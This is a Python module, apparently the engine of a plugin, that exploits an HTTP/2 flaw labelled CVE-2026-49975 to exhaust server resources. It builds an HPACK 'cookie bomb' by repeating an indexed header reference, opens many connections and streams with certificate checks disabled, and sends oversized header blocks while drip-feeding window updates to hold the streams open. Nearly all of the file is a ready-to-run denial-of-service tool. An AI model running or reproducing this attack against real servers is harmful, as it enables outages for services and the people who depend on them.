"""HTTP/2 frame engine used by the CVE-2026-49975 NetPulse plugin.

The module intentionally has no Qt dependencies.  It keeps every socket in a
controller-owned set so a stop request can close connections immediately.
"""
from __future__ import annotations

import socket
import ssl
import struct
import threading
import time
from typing import Callable, Iterable, List, Tuple


CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
FRAME_DATA = 0x0
FRAME_HEADERS = 0x1
FRAME_RST_STREAM = 0x3
FRAME_SETTINGS = 0x4
FRAME_PING = 0x6
FRAME_GOAWAY = 0x7
FRAME_WINDOW_UPDATE = 0x8
FRAME_CONTINUATION = 0x9
FLAG_ACK = 0x1
FLAG_END_STREAM = 0x1
FLAG_END_HEADERS = 0x4
SETTINGS_INITIAL_WINDOW_SIZE = 0x4


def h2_frame(frame_type: int, flags: int, stream_id: int, payload: bytes) -> bytes:
    return (len(payload).to_bytes(3, "big") + bytes([frame_type, flags])
            + struct.pack("!I", stream_id & 0x7FFFFFFF) + payload)


def hpack_int(value: int, prefix_bits: int, first_byte_prefix: int) -> bytes:
    max_prefix = (1 << prefix_bits) - 1
    if value < max_prefix:
        return bytes([first_byte_prefix | value])
    out = bytearray([first_byte_prefix | max_prefix])
    value -= max_prefix
    while value >= 128:
        out.append((value & 0x7F) | 0x80)
        value >>= 7
    out.append(value)
    return bytes(out)


def hpack_string(data: bytes) -> bytes:
    return hpack_int(len(data), 7, 0) + data


def indexed(index: int) -> bytes:
    return hpack_int(index, 7, 0x80)


def literal_indexed_name_with_indexing(name_index: int, value: bytes) -> bytes:
    return hpack_int(name_index, 6, 0x40) + hpack_string(value)


def literal_indexed_name_without_indexing(name_index: int, value: bytes) -> bytes:
    return hpack_int(name_index, 4, 0) + hpack_string(value)


def build_cookie_bomb(authority: str, path: str, refs: int, scheme: str = "http") -> bytes:
    block = bytearray()
    block += indexed(2)  # :method GET
    block += indexed(7 if scheme == "https" else 6)  # :scheme
    block += literal_indexed_name_without_indexing(4, path.encode("utf-8"))
    block += literal_indexed_name_without_indexing(1, authority.encode("utf-8"))
    block += literal_indexed_name_with_indexing(32, b"")
    block += indexed(62) * refs
    return bytes(block)


def settings_payload(settings: Iterable[Tuple[int, int]]) -> bytes:
    return b"".join(struct.pack("!HI", key, value) for key, value in settings)


def recv_exact(sock: socket.socket, size: int) -> bytes:
    result = bytearray()
    while len(result) < size:
        part = sock.recv(size - len(result))
        if not part:
            raise EOFError("socket closed")
        result += part
    return bytes(result)


def read_frame(sock: socket.socket) -> Tuple[int, int, int, bytes]:
    header = recv_exact(sock, 9)
    length = int.from_bytes(header[:3], "big")
    frame_type = header[3]
    flags = header[4]
    stream_id = struct.unpack("!I", header[5:9])[0] & 0x7FFFFFFF
    return frame_type, flags, stream_id, recv_exact(sock, length)


def _wrap_tls(sock: socket.socket, host: str) -> socket.socket:
    context = ssl._create_unverified_context()
    context.set_alpn_protocols(["h2", "http/1.1"])
    wrapped = context.wrap_socket(sock, server_hostname=host,
                                  suppress_ragged_eofs=True)
    if wrapped.selected_alpn_protocol() not in ("h2", None):
        wrapped.close()
        raise OSError("TLS endpoint did not negotiate HTTP/2")
    return wrapped


def connect_h2(host: str, port: int, timeout: float, tls: bool,
               initial_window: int) -> socket.socket:
    sock = socket.create_connection((host, port), timeout=timeout)
    try:
        if tls:
            sock = _wrap_tls(sock, host)
        sock.settimeout(timeout)
        sock.sendall(CLIENT_PREFACE)
        sock.sendall(h2_frame(FRAME_SETTINGS, 0, 0,
                              settings_payload([(SETTINGS_INITIAL_WINDOW_SIZE,
                                                  initial_window)])))
        deadline = time.monotonic() + min(timeout, 2.0)
        while time.monotonic() < deadline:
            try:
                frame_type, flags, _sid, payload = read_frame(sock)
            except socket.timeout:
                break
            if frame_type == FRAME_SETTINGS and not (flags & FLAG_ACK):
                sock.sendall(h2_frame(FRAME_SETTINGS, FLAG_ACK, 0, b""))
                break
            if frame_type == FRAME_GOAWAY:
                raise OSError("peer sent GOAWAY")
            if frame_type == FRAME_PING and not (flags & FLAG_ACK):
                sock.sendall(h2_frame(FRAME_PING, FLAG_ACK, 0, payload))
        return sock
    except Exception:
        try:
            sock.close()
        except OSError:
            pass
        raise


def send_header_block(sock: socket.socket, stream_id: int, block: bytes) -> int:
    max_frame = 16384
    chunks = [block[i:i + max_frame] for i in range(0, len(block), max_frame)] or [b""]
    count = 0
    for index, chunk in enumerate(chunks):
        flags = FLAG_END_STREAM if index == 0 else 0
        if index == len(chunks) - 1:
            flags |= FLAG_END_HEADERS
        sock.sendall(h2_frame(FRAME_HEADERS if index == 0 else FRAME_CONTINUATION,
                              flags, stream_id, chunk))
        count += 1
    return count


def drip_window(sock: socket.socket, stream_ids: List[int], amount: int) -> None:
    if amount <= 0:
        return
    sock.sendall(h2_frame(FRAME_WINDOW_UPDATE, 0, 0,
                          struct.pack("!I", amount * max(1, len(stream_ids)))))
    for stream_id in stream_ids:
        sock.sendall(h2_frame(FRAME_WINDOW_UPDATE, 0, stream_id,
                              struct.pack("!I", amount)))


def service_peer_frames(sock: socket.socket, seconds: float,
                        stop_event: threading.Event) -> dict:
    counts = {"settings": 0, "ping": 0, "goaway": 0, "rst": 0,
              "data": 0, "headers": 0, "other": 0, "closed": False}
    deadline = time.monotonic() + seconds
    sock.settimeout(0.1)
    while time.monotonic() < deadline and not stop_event.is_set():
        try:
            frame_type, flags, _stream_id, payload = read_frame(sock)
        except socket.timeout:
            continue
        except (EOFError, OSError):
            counts["closed"] = True
            break
        if frame_type == FRAME_SETTINGS and not (flags & FLAG_ACK):
            counts["settings"] += 1
            try:
                sock.sendall(h2_frame(FRAME_SETTINGS, FLAG_ACK, 0, b""))
            except OSError:
                break
        elif frame_type == FRAME_PING and not (flags & FLAG_ACK):
            counts["ping"] += 1
            try:
                sock.sendall(h2_frame(FRAME_PING, FLAG_ACK, 0, payload))
            except OSError:
                break
        elif frame_type == FRAME_GOAWAY:
            counts["goaway"] += 1
        elif frame_type == FRAME_RST_STREAM:
            counts["rst"] += 1
        elif frame_type == FRAME_DATA:
            counts["data"] += 1
        elif frame_type == FRAME_HEADERS:
            counts["headers"] += 1
        else:
            counts["other"] += 1
    return counts


class AttackEngine:
    """Runs one PoC worker per configured connection."""

    def __init__(self, host: str, port: int, tls: bool, path: str, connections: int,
                 streams: int, refs: int, hold: float, initial_window: int,
                 drip_interval: float, drip_bytes: int,
                 on_event: Callable[[dict], None] | None = None):
        self.host, self.port, self.tls, self.path = host, port, tls, path
        self.connections = connections
        self.streams = streams
        self.refs = refs
        self.hold = hold
        self.initial_window = initial_window
        self.drip_interval = drip_interval
        self.drip_bytes = drip_bytes
        self.on_event = on_event or (lambda _event: None)
        self.stop_event = threading.Event()
        self._threads: list[threading.Thread] = []
        self._sockets: set[socket.socket] = set()
        self._lock = threading.Lock()

    def start(self) -> None:
        block = build_cookie_bomb(self.host, self.path, self.refs,
                                  "https" if self.tls else "http")
        for conn_id in range(self.connections):
            thread = threading.Thread(target=self._run_connection,
                                      args=(conn_id, block), daemon=True)
            self._threads.append(thread)
            thread.start()
        self.on_event({"kind": "started", "connections": self.connections,
                       "streams": self.streams, "refs": self.refs,
                       "payload_bytes": len(block)})

    def _track(self, sock: socket.socket) -> None:
        with self._lock:
            self._sockets.add(sock)

    def _untrack(self, sock: socket.socket) -> None:
        with self._lock:
            self._sockets.discard(sock)

    def _run_connection(self, conn_id: int, block: bytes) -> None:
        sock = None
        try:
            sock = connect_h2(self.host, self.port, 5.0, self.tls,
                              self.initial_window)
            self._track(sock)
            stream_ids = [1 + 2 * i for i in range(self.streams)]
            for stream_id in stream_ids:
                if self.stop_event.is_set():
                    return
                send_header_block(sock, stream_id, block)
            self.on_event({"kind": "connection", "id": conn_id,
                           "streams": len(stream_ids), "state": "running"})
            deadline = time.monotonic() + self.hold
            while time.monotonic() < deadline and not self.stop_event.is_set():
                wait_for = min(self.drip_interval, max(0.0, deadline - time.monotonic()))
                peer = service_peer_frames(sock, wait_for, self.stop_event)
                if self.stop_event.is_set():
                    break
                if peer.get("closed"):
                    self.on_event({"kind": "connection", "id": conn_id,
                                   "state": "peer_closed"})
                    return
                if self.drip_interval > 0 and time.monotonic() < deadline:
                    drip_window(sock, stream_ids, self.drip_bytes)
            self.on_event({"kind": "connection", "id": conn_id, "state": "finished"})
        except (OSError, EOFError) as exc:
            self.on_event({"kind": "connection", "id": conn_id,
                           "state": "failed", "error": str(exc)})
        finally:
            if sock is not None:
                self._untrack(sock)
                try:
                    sock.close()
                except OSError:
                    pass

    def stop(self) -> None:
        self.stop_event.set()
        with self._lock:
            sockets = list(self._sockets)
        for sock in sockets:
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                sock.close()
            except OSError:
                pass
        for thread in self._threads:
            thread.join(timeout=1.5)
        self._threads.clear()

    def is_alive(self) -> bool:
        return any(thread.is_alive() for thread in self._threads)


def probe_http2(host: str, port: int, tls: bool, timeout: float = 5.0) -> bool:
    """Open a short HTTP/2 connection and complete a PING round trip."""
    sock = None
    try:
        sock = connect_h2(host, port, timeout, tls, 65535)
        opaque = b"NPULSE01"
        sock.sendall(h2_frame(FRAME_PING, 0, 0, opaque))
        end = time.monotonic() + timeout
        while time.monotonic() < end:
            frame_type, flags, _sid, payload = read_frame(sock)
            if frame_type == FRAME_PING and (flags & FLAG_ACK) and payload == opaque:
                return True
            if frame_type == FRAME_SETTINGS and not (flags & FLAG_ACK):
                sock.sendall(h2_frame(FRAME_SETTINGS, FLAG_ACK, 0, b""))
        return False
    except (OSError, EOFError, ValueError):
        return False
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
